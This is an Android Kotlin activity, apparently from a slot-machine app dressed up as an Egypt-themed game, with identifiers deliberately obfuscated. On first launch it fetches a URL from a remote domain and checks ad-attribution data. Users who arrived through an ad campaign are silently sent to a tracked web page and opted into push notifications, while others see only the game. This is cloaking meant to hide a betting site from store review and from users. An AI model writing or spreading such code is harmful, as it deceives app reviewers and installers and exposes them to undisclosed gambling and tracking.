package com.superslots.wingames

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.mutableStateOf
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import com.superslots.domain.usecase.Constants
import com.superslots.domain.usecase.netChe
import com.superslots.ui.theme.EgyptGameTheme
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request


val spalsh = "splash"
val game = "game"
class BetBooster : ComponentActivity() {

    private val viewModel: JIhuuHUWQrh by viewModels()
    private lateinit var sharedPreferences: SharedPreferences
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val jqwrqwrqwiriwqir = WindowCompat.getInsetsController(window,window.decorView)
        jqwrqwrqwiriwqir.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        jqwrqwrqwiriwqir.hide(WindowInsetsCompat.Type.systemBars())


        val canWeGo = mutableStateOf(false)
        sharedPreferences = getSharedPreferences("MEGABET", Context.MODE_PRIVATE)


        OneSignal.initWithContext(this, Constants.oneSignalIdKey)

        val qijwrhqwrihqiwr2 = "https://zenithleague.lol/p6twp7"
        val qwirqwhrqjwiri2 = AppsFlyerLib.getInstance().getAppsFlyerUID(this)

        if(netChe(this)) {
            val ijqwrqwjrqowr2 = OkHttpClient()
            val qwrijwqrhwqhrwr = Request.Builder().url(qijwrhqwrihqiwr2).build()
            val scope = CoroutineScope(Dispatchers.IO)
            scope.launch {

                    if (ijiqriqwrqowrhiqwrij2()) {
                        val ijqwroqwrqjwrjoqwrjo2 = ijqwrqwjrqowr2.newCall(qwrijwqrhwqhrwr).execute()
                        val ijqwrqwrjiqwjrwji2 = ijqwroqwrqjwrjoqwrjo2.code
                        if (!sharedPreferences.contains("code")) {
                            sharedPreferences.edit().putInt(
                                "code",
                                ijqwrqwrjiqwjrwji2
                            ).apply()
                        }

                        withContext(Dispatchers.Main) {
                            viewModel.jiqwruqy7wrqjiurhiqwrjqir(this@BetBooster) { conversionData ->

                                if (conversionData != null && conversionData["af_status"].toString()
                                        .contains("No")
                                ) {
                                    handleConversionData(
                                        conversionData,
                                        qwirqwhrqjwiri2.toString(),
                                        ijqwroqwrqjwrjoqwrjo2.body?.string().toString()
                                    )

                                } else {
                                    if (sharedPreferences.getString("siteUrl", "")
                                            .isNullOrEmpty()
                                        && ijqwrqwrjiqwjrwji2 == 200
                                    ) {
                                        sharedPreferences.edit().putString(
                                            "siteUrl",
                                            ijqwroqwrqjwrjoqwrjo2.body?.string().toString()
                                        ).apply()
                                    }

                                    navigateToSiteUrl(canWeGo, ijqwrqwrjiqwjrwji2)
                                }


                            }


                            markFirstLaunch()
                        }
                    } else {
                        navigateToSiteUrl(canWeGo,sharedPreferences.getInt("code",404))

                    }
            }
        }
        else
            navigateToSiteUrl(canWeGo,404)





        setContent {
            EgyptGameTheme {
                    val navController = rememberNavController()
                        NavHost(navController = navController, startDestination = spalsh){
                            composable(spalsh){
                                SplashBetScreen(canWeGo = canWeGo ) {
                                    navController.navigate(game){launchSingleTop=true}
                                }

                            }
                            composable(game){
                                EgyptGameScreen()
                            }
                        }
            }
        }
    }

    private fun ijiqriqwrqowrhiqwrij2(): Boolean {
        val ijqwirqwriqwriqjir2 = getPreferences(Context.MODE_PRIVATE)
        return ijqwirqwriqwriqjir2.getBoolean("isFirstLaunch", true)
    }

    private fun markFirstLaunch() {
        val qjwirjqwriwjqiiriwqjir = getPreferences(Context.MODE_PRIVATE).edit()
        qjwirjqwriwjqiiriwqjir.putBoolean("isFirstLaunch", false)
        qjwirjqwriwjqiiriwqjir.apply()
    }
    private fun handleConversionData(
        data: Map<String, Any>,
        appsFlyerUid: String,
        someValue: String
    ) {
        val eventData = mapOf(
            "c" to data["campaign"].toString(),
            "afID" to appsFlyerUid,
            "ad" to viewModel.iijhuy7UHu8qhuqwr
        )

        OneSignal.login(viewModel.iijhuy7UHu8qhuqwr)
        OneSignal.User.pushSubscription.optIn()
        val newLink = viewModel.buildFinalLink(someValue, viewModel.iqjwrjiqwjirqijwrjiqw, eventData)

        val tripEgypt = Intent(this@BetBooster,IJHUrwuqry7qwruhruu::class.java)
        tripEgypt.putExtra("url",newLink)
        sharedPreferences.edit().putString("siteUrl",newLink).apply()
        startActivity(tripEgypt)
        finish()

    }

    private fun navigateToSiteUrl(canWeGo:MutableState<Boolean>,responseCode:Int) {


        if (sharedPreferences.contains("siteUrl") ||responseCode == 200 ) {
          val link =  sharedPreferences.getString("siteUrl", null)

            val tripEgypt = Intent(this@BetBooster,IJHUrwuqry7qwruhruu::class.java)
            tripEgypt.putExtra("url",link)
            sharedPreferences.edit().putString("siteUrl",link).apply()
            startActivity(tripEgypt)
            finish()
        } else {

                canWeGo.value = true
        }
    }

}